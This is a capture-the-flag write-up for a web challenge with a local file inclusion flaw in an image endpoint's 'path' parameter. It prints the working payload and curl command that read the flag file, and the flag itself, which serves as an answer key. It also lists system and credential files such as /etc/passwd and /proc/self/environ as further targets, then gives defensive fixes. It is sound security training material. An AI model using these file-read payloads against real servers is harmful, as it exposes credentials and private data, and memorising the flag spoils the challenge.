# Shopping! (Level 1) - SOLUTION

## Challenge Information
- **Challenge Name**: Shopping! (Level 1)
- **URL**: https://shopping-l1-ctf.tdho.st/
- **Category**: Web / Local File Inclusion (LFI)
- **Difficulty**: Level 1 (Easy)

## FLAG
```
TDHT{SmlChucIb58jz7n1Md52Y1YmQp}
```

## Vulnerability
**Local File Inclusion (LFI)** in the `/image.php` endpoint. The application uses a `path` parameter to load product images without proper validation, allowing arbitrary file reads from the filesystem.

## Exploitation Steps

### 1. Initial Reconnaissance
The shopping site displays 9 products with images loaded via:
```html
<img src="/image.php?path=/var/www/html/bag.png" alt="Canvas Tote">
```

This immediately reveals:
- An `image.php` endpoint that accepts a `path` parameter
- The full filesystem path is exposed: `/var/www/html/`
- No apparent sanitization or validation on the path parameter

### 2. Identifying the Vulnerability
The `path` parameter in `/image.php` is vulnerable to LFI because:
- It accepts absolute filesystem paths
- No input validation or path sanitization
- Direct file reading capability

### 3. Testing LFI
Attempted to read various common flag locations:
```bash
/flag.txt          - Failed
/tmp/flag.txt      - Failed  
/var/www/html/flag - Failed
/root/flag.txt     - Failed
/etc/flag.txt      - SUCCESS!
```

### 4. Retrieving the Flag
**Successful payload:**
```
https://shopping-l1-ctf.tdho.st/image.php?path=/etc/flag.txt
```

**Response:**
- Status: 200 OK
- Content-Type: text/plain;charset=UTF-8
- Content: `TDHT{SmlChucIb58jz7n1Md52Y1YmQp}`

## Automated Exploitation
Run the provided Python script:
```bash
python shopping_exploit.py
```

The script:
1. Tests the LFI vulnerability
2. Tries common flag file locations
3. Attempts path traversal techniques
4. Tests PHP filter wrappers
5. Automatically extracts and displays the flag

## Alternative Manual Exploitation
Simply visit in browser:
```
https://shopping-l1-ctf.tdho.st/image.php?path=/etc/flag.txt
```

Or use curl:
```bash
curl "https://shopping-l1-ctf.tdho.st/image.php?path=/etc/flag.txt"
```

## Technical Details

### Vulnerable Code (Hypothetical)
```php
<?php
// image.php - VULNERABLE CODE
$path = $_GET['path'];
$content = file_get_contents($path);  // No validation!
header('Content-Type: image/png');
echo $content;
?>
```

### Why It Works
1. **No Path Validation**: The `path` parameter is used directly without checking if it's within allowed directories
2. **Absolute Paths Allowed**: The application accepts absolute filesystem paths
3. **No Whitelisting**: No restriction to specific file extensions or directories
4. **Direct File Access**: Uses `file_get_contents()` or similar without security checks

## Other Files That Could Be Read
With this vulnerability, we could also read:
```
/etc/passwd           - System user information
/etc/hosts            - Network configuration
/var/www/html/*.php   - Application source code
/proc/self/environ    - Environment variables
/var/log/*.log        - Application logs
```

## Impact
- **Confidentiality Breach**: Any file readable by the web server can be accessed
- **Source Code Disclosure**: PHP files can be read using PHP filters
- **Credential Exposure**: Configuration files with database passwords, API keys
- **System Information**: OS details, installed software

## Defense Recommendations

### 1. Input Validation
```php
// Validate that path is within allowed directory
$allowed_dir = '/var/www/html/images/';
$real_path = realpath($allowed_dir . basename($_GET['path']));

if (strpos($real_path, $allowed_dir) !== 0) {
    die('Invalid path');
}
```

### 2. Whitelist Approach
```php
// Only allow specific filenames
$allowed_files = ['bag.png', 'lamp.png', 'bottle.png', ...];
$filename = basename($_GET['path']);

if (!in_array($filename, $allowed_files)) {
    die('File not found');
}
```

### 3. Use IDs Instead of Paths
```php
// Map IDs to filenames
$files = [
    1 => '/var/www/html/bag.png',
    2 => '/var/www/html/lamp.png',
    // ...
];

$id = intval($_GET['id']);
if (isset($files[$id])) {
    $path = $files[$id];
} else {
    die('Invalid ID');
}
```

### 4. Disable Directory Traversal
```php
// Remove directory traversal attempts
$path = str_replace(['../', '..\\'], '', $_GET['path']);
// But this alone is not sufficient!
```

### 5. Use PHP Configuration
```ini
; In php.ini
open_basedir = /var/www/html/
; Restricts PHP file operations to specific directory
```

## Key Lessons
1. **Never trust user input** for file paths
2. **Use indirect references** (IDs) instead of direct file paths
3. **Implement proper path validation** with whitelisting
4. **Restrict filesystem access** at the application and system level
5. **Use realpath()** to resolve symbolic links and verify paths

## Timeline
- Challenge Started: August 23, 2026
- Flag Retrieved: August 23, 2026
- Time to Solve: < 2 minutes

## Tools Used
- Python 3 with requests library
- Web browser
- curl (optional)

---

**Status**: ✅ SOLVED
**Flag**: `TDHT{SmlChucIb58jz7n1Md52Y1YmQp}`
